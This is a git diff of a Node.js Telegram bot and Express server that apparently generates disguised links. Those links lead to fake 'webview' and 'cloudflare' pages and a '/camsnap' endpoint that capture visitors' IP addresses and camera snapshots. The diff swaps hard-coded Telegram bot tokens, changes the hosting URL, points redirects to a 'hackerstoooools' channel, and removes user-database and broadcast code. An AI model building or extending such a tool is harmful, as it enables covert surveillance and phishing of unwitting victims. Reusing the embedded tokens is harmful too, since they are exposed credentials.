@@ -1,5 +1,4 @@
 const fs = require("fs");
-const sqlite3 = require('sqlite3').verbose();
 const express = require("express");
 const cors = require('cors');
 const bodyParser = require('body-parser');
@@ -8,7 +7,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const botOwnerId = 1249726999;
 
 // Directly adding the token to the code
-const botToken = '6798138042:AAEm4hyRxjDLQyXeJDQztnuTbWzqPdHVXlw';
+const botToken = '6104998193:AAE3w2GAh4QiKTWFsd0sozc_0ilCHsFNnzQ';
 
 // Create a bot that uses 'polling' to fetch new updates
 const bot = new TelegramBot(botToken, { polling: true });
@@ -19,22 +18,9 @@ app.use(bodyParser.urlencoded({ extended: true, limit: 1024 * 1024 * 20, type: '
 app.set("view engine", "ejs");
 
 // Modify your URL here
-var hostURL = "https://sgmodder.adaptable.app";
+var hostURL = "https://gen.djdjkdsk.repl.co";
 // TOGGLE for Shorters
 var use1pt = false;
-
-// Create or connect to SQLite database
-const db = new sqlite3.Database('bot_database.db');
-
-// Create the users table if it doesn't exist
-db.run(`
-    CREATE TABLE IF NOT EXISTS users (
-        chat_id INTEGER PRIMARY KEY,
-        subscribed INTEGER,
-        name TEXT,
-        username TEXT
-    )
-`);
 
 // Function to check if the user has joined the channel
 async function checkChannelMembership(chatId) {
@@ -47,217 +33,6 @@ async function checkChannelMembership(chatId) {
   }
 }
 
-// Mock database (replace this with actual usage)
-let userDatabase = new Map(); // Key: user ID, Value: object containing details
-let adminDatabase = new Set(); // Store admin user IDs
-
-// Load user data from SQLite database on bot startup
-db.all('SELECT * FROM users', (error, rows) => {
-    if (error) {
-        console.error('Error loading user data from database:', error);
-        return;
-    }
-
-    rows.forEach(row => {
-        userDatabase.set(row.chat_id, {
-            subscribed: row.subscribed,
-            name: row.name,
-            username: row.username,
-        });
-    });
-});
-
-// Command to start the subscription
-bot.onText(/\/start|\/create/, (msg) => {
-    const chatId = msg.chat.id;
-    if (!userDatabase.has(chatId)) {
-        userDatabase.set(chatId, {
-            subscribed: true,
-            name: msg.from.first_name,
-            username: msg.from.username,
-        });
-
-        // Save the user's chat ID in the SQLite database
-        db.run(
-            'INSERT OR REPLACE INTO users (chat_id, subscribed, name, username) VALUES (?, ?, ?, ?)',
-            [chatId, 1, msg.from.first_name, msg.from.username],
-            error => {
-                if (error) {
-                    console.error('Error saving user data:', error);
-                }
-            }
-        );
-    }
-});
-
-// Command to start the broadcasting process
-bot.onText(/\/startbroadcast/, (msg) => {
-    const chatId = msg.chat.id;
-
-    if (adminDatabase.has(chatId.toString()) || chatId.toString() === ownerChatId) {
-        bot.sendMessage(chatId, "Please send the broadcast message, or a photo, video, document, or any content:");
-        bot.once('message', (adminMsg) => {
-            if (adminMsg.text && adminMsg.text !== '/startbroadcast') {
-                const numberOfUsers = broadcastToAll(adminMsg);
-                bot.sendMessage(chatId, `Broadcast sent to ${numberOfUsers} users.`);
-            } else {
-                bot.sendMessage(chatId, "Broadcast not sent. Please provide a valid message.");
-            }
-        });
-    }
-});
-
-// Command to list users' details
-bot.onText(/\/list/, (msg) => {
-    const chatId = msg.chat.id;
-
-    if (adminDatabase.has(chatId.toString()) || chatId.toString() === ownerChatId) {
-        listUsersDetails(chatId);
-    }
-});
-
-// Command to get bot status
-bot.onText(/\/status/, (msg) => {
-    const chatId = msg.chat.id;
-
-    if (adminDatabase.has(chatId.toString()) || chatId.toString() === ownerChatId) {
-        getBotStatus(chatId);
-    }
-});
-
-// Command to make a user an admin
-bot.onText(/\/makeadmin (.+)/, (msg, match) => {
-    const chatId = msg.chat.id;
-
-    if (chatId.toString() === ownerChatId) {
-        const targetUsername = match[1];
-        const targetUser = getUserByUsername(targetUsername);
-
-        if (targetUser) {
-            adminDatabase.add(targetUser.id.toString());
-            bot.sendMessage(chatId, `User ${targetUser.first_name} (@${targetUser.username}) is now an admin.`);
-        } else {
-            bot.sendMessage(chatId, "User not found.");
-        }
-    }
-});
-
-// Command to remove admin privileges from a user
-bot.onText(/\/removeadmin (.+)/, (msg, match) => {
-    const chatId = msg.chat.id;
-
-    if (chatId.toString() === ownerChatId) {
-        const targetUsername = match[1];
-        const targetUser = getUserByUsername(targetUsername);
-
-        if (targetUser) {
-            adminDatabase.delete(targetUser.id.toString());
-            bot.sendMessage(chatId, `Admin privileges removed from the user ${targetUser.first_name} (@${targetUser.username}).`);
-        } else {
-            bot.sendMessage(chatId, "User not found.");
-        }
-    }
-});
-
-// Broadcast function for any type of content
-function broadcastToAll(content) {
-    let numberOfUsers = 0;
-    userDatabase.forEach((details, user) => {
-        if (details.subscribed) {
-            numberOfUsers++;
-            // Forward any type of message or content
-            if (content.text) {
-                bot.sendMessage(user, content.text);
-            } else if (content.photo) {
-                const photoId = content.photo[0].file_id;
-                bot.sendPhoto(user, photoId);
-            } else if (content.video) {
-                const videoId = content.video.file_id;
-                bot.sendVideo(user, videoId);
-            } else if (content.document) {
-                const documentId = content.document.file_id;
-                bot.sendDocument(user, documentId);
-            }
-        }
-    });
-    return numberOfUsers;
-}
-
-// Command to start the subscription
-bot.onText(/\/start|\/create/, (msg) => {
-    const chatId = msg.chat.id;
-    if (!userDatabase.has(chatId)) {
-        userDatabase.set(chatId, {
-            subscribed: true,
-            name: msg.from.first_name,
-            username: msg.from.username,
-        });
-    }
-});
-
-// List users' details
-function listUsersDetails(adminChatId) {
-    let detailsList = "Users Details:\n\n";
-    userDatabase.forEach((details, user) => {
-        detailsList += `Name: ${details.name}\nUsername: ${details.username}\nChat ID: ${user}\n\n`;
-    });
-
-    if (detailsList !== "Users Details:\n\n") {
-        fs.writeFileSync('users_details.txt', detailsList, 'utf-8');
-        bot.sendDocument(adminChatId, 'users_details.txt');
-    } else {
-        bot.sendMessage(adminChatId, "No user details to list.");
-    }
-}
-
-// Get bot status
-function getBotStatus(adminChatId) {
-    const totalAdmins = adminDatabase.size;
-    const totalUsers = userDatabase.size;
-    const totalBroadcasts = 0; // Implement your logic to track broadcasts
-
-    const statusMessage = `
-Bot Status:
-
-Owners: ${getOwnerDetails()}
-Total Admins: ${totalAdmins}
-Total Users: ${totalUsers}
-Total Broadcasts: ${totalBroadcasts}
-`;
-
-    bot.sendMessage(adminChatId, statusMessage);
-}
-
-// Get owner details
-function getOwnerDetails() {
-    const owner = userDatabase.get(parseInt(ownerChatId));
-    return `${owner.name} (@${owner.username})`;
-}
-
-// Get a user by their username
-function getUserByUsername(username) {
-    for (let [userId, details] of userDatabase.entries()) {
-        if (details.username === username) {
-            return {
-                id: userId,
-                first_name: details.name,
-                username: details.username,
-            };
-        }
-    }
-    return null;
-}
-
-// Start listening for user interactions
-bot.on('message', (msg) => {
-    const chatId = msg.chat.id;
-    const message = msg.text.toLowerCase();
-
-    if (message.includes('unsubscribe')) {
-        userDatabase.delete(chatId);
-    }
-});
-
 app.get("/w/:path/:uri", (req, res) => {
   var ip;
   var d = new Date();
@@ -268,7 +43,7 @@ app.get("/w/:path/:uri", (req, res) => {
     res.render("webview", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
   }
   else {
-    res.redirect("https://t.me/SG_Modder1");
+    res.redirect("https://t.me/hackerstoooools");
   }
 });
 
@@ -282,7 +57,7 @@ app.get("/c/:path/:uri", (req, res) => {
     res.render("cloudflare", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
   }
   else {
-    res.redirect("https://t.me/SG_Modder1");
+    res.redirect("https://t.me/hackerstoooools");
   }
 });
 
@@ -400,7 +175,7 @@ bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
       const m = {
         reply_markup: JSON.stringify({ "inline_keyboard": [[joinButton]] })
       };
-      bot.sendMessage(cid, "🚨 **Attention!** 🚨\n\n🚀 𝗬𝗼𝘂 𝗺𝘂𝘀𝘁 𝗷𝗼𝗶𝗻 𝘁𝗵𝗲 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗯𝗲𝗳𝗼𝗿𝗲 𝘂𝘀𝗶𝗻𝗴 𝗼𝘁𝗵𝗲𝗿 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀. 🌟\n\n🔌 𝗧𝗼 𝗷𝗼𝗶𝗻, 𝗽𝗹𝗲𝗮𝘀𝗲 𝗳𝗼𝗹𝗹𝗼𝘄 𝘁𝗵𝗲𝘀𝗲 𝘀𝘁𝗲𝗽𝘀: 🔌\n\n1. Click on theJoin Channel button below. 📲🔗\n2. After joining the channel, feel free to try other commands. 🚀📝\n3. If you have any questions, don't hesitate to ask. We're here to help! 💬🤗\n\n✨ 𝗝𝗼𝗶𝗻 𝘁𝗵𝗲 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗳𝗼𝗿 𝗲𝘅𝗰𝗹𝘂𝘀𝗶𝘃𝗲 𝘂𝗽𝗱𝗮𝘁𝗲𝘀. 𝗧𝗵𝗮𝗻𝗸 ??𝗼𝘂! 🌈🎉.", m);
+      bot.sendMessage(cid, "🚨 **Attention!** 🚨\n\n🚀 𝗬𝗼𝘂 𝗺𝘂𝘀𝘁 𝗷𝗼𝗶𝗻 𝘁𝗵𝗲 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗯𝗲𝗳𝗼𝗿𝗲 𝘂𝘀𝗶𝗻𝗴 𝗼𝘁𝗵𝗲𝗿 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀. 🌟\n\n🔌 𝗧𝗼 𝗷𝗼𝗶𝗻, 𝗽𝗹𝗲𝗮𝘀𝗲 𝗳𝗼𝗹𝗹𝗼𝘄 𝘁𝗵𝗲𝘀𝗲 𝘀𝘁𝗲𝗽𝘀: 🔌\n\n1. Click on theJoin Channel button below. 📲🔗\n2. After joining the channel, feel free to try other commands. 🚀📝\n3. If you have any questions, don't hesitate to ask. We're here to help! 💬🤗\n\n✨ 𝗝𝗼𝗶𝗻 𝘁𝗵𝗲 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗳𝗼𝗿 𝗲𝘅𝗰𝗹𝘂𝘀𝗶𝘃𝗲 𝘂𝗽𝗱𝗮𝘁𝗲𝘀. 𝗧𝗵𝗮𝗻𝗸 𝘆𝗼𝘂! 🌈🎉.", m);
       return;
     }
     createNew(cid);
@@ -504,7 +279,7 @@ async function generateLinkButton(cid) {
     { name: "📝Ｃｈａｔ-ＧＰＴ💬", url: "http://sgchatgpt.zapier.app/" },
     // Add more social media sites as needed
   ];
-
+  
   const generateButtonList = socialMediaSites.map(site => [{ text: site.name, callback_data: `gen_${site.url}` }]);
   
   // Sending the link buttons
@@ -529,6 +304,7 @@ bot.onText(/\/generateNewLink/, (msg) => {
   generateLinkButton(chatId);
 });
 
+// ... (remaining code)
 
 app.get("/", (req, res) => {
   var ip;
@@ -578,35 +354,6 @@ app.post("/camsnap", (req, res) => {
     res.send("Done");
   }
 });
-
-// Example usage
-bot.on('polling_error', (error) => {
-    console.error(error);
-});
-
-// Broadcast function for any type of content
-function broadcastToAll(content) {
-    let numberOfUsers = 0;
-    userDatabase.forEach((details, user) => {
-        if (details.subscribed) {
-            numberOfUsers++;
-            // Forward any type of message or content
-            if (content.text) {
-                bot.sendMessage(user, content.text);
-            } else if (content.photo) {
-                const photoId = content.photo[0].file_id;
-                bot.sendPhoto(user, photoId);
-            } else if (content.video) {
-                const videoId = content.video.file_id;
-                bot.sendVideo(user, videoId);
-            } else if (content.document) {
-                const documentId = content.document.file_id;
-                bot.sendDocument(user, documentId);
-            }
-        }
-    });
-    return numberOfUsers;
-}
 
 app.listen(3000, () => console.log("App Running on Port 3000!"));
  
